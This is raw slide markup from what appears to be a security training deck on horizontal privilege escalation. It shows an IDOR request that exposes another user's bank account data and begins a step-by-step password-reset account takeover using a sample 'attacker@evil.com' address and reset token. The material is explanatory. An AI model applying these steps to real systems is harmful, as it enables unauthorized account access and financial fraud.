            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7517844" y="4273391"/>
            <a:ext cx="4259104" cy="1997154"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2737"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7511415" y="4273391"/>
            <a:ext cx="4271963" cy="1997154"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 978"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7641550" y="4370903"/>
            <a:ext cx="4011692" cy="1802130"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># Attacker changes account ID to access another user's account</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>GET /api/account/12346</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Response:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  "accountId": 12346,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  "owner": "Jane Smith",</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  "balance": 150000,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  "accountNumber": "9876-5432-1098"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2824401" y="6438424"/>
            <a:ext cx="8981480" cy="403146"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13561"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B3E5FF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2954536" y="6616660"/>
            <a:ext cx="162639" cy="130135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3247311" y="6545580"/>
            <a:ext cx="8428434" cy="163830"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Impact:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Attacker can view ANY bank account by changing the ID!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3322796"/>
            <a:ext cx="7405688" cy="651272"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Horizontal Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6280190" y="4271724"/>
            <a:ext cx="755642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Understanding how attackers access resources belonging to other users at the same privilege level through authorization vulnerabilities</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88670" y="548521"/>
            <a:ext cx="6011347" cy="420529"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Banking Application Account Takeover</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="1142167"/>
            <a:ext cx="1443038" cy="211574"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20356"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="865465" y="1180505"/>
            <a:ext cx="1289447" cy="134898"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CRITICAL VULNERABILITY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2295763" y="1134547"/>
            <a:ext cx="1290876" cy="226814"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18988"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="007EBD"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2380178" y="1180505"/>
            <a:ext cx="1122045" cy="134898"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>REAL-WORLD EXPLOIT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="1454467"/>
            <a:ext cx="13053060" cy="168831"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>This demonstrates a critical password reset vulnerability in an online banking platform where token validation exists but user ownership verification is missing, enabling complete account takeover.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="1716405"/>
            <a:ext cx="128111" cy="160139"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="1918930"/>
            <a:ext cx="6485096" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="2013466"/>
            <a:ext cx="2609374" cy="210264"/>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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker Requests Password Reset</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="2273379"/>
            <a:ext cx="6485096" cy="506492"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The attacker initiates a legitimate password reset for their own account: POST /api/request-reset with email "attacker@evil.com". The system responds with a valid reset token "abc123xyz789" and sends a reset link to the attacker's email.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7356515" y="1716405"/>
            <a:ext cx="128111" cy="160139"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7356515" y="1918930"/>
            <a:ext cx="6485215" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7356515" y="2013466"/>
            <a:ext cx="1682234" cy="210264"/>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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Token Received</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7356515" y="2273379"/>
            <a:ext cx="6485215" cy="337661"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker receives legitimate reset token via email with reset link: https://bank.com/reset?token=abc123xyz789. This token passes validation but lacks user binding checks.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="2958703"/>
            <a:ext cx="128111" cy="160139"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="3161228"/>
            <a:ext cx="6485096" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="788670" y="3255764"/>
            <a:ext cx="1682234" cy="210264"/>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Petrona Bold" pitchFamily="34" charset="0"/>
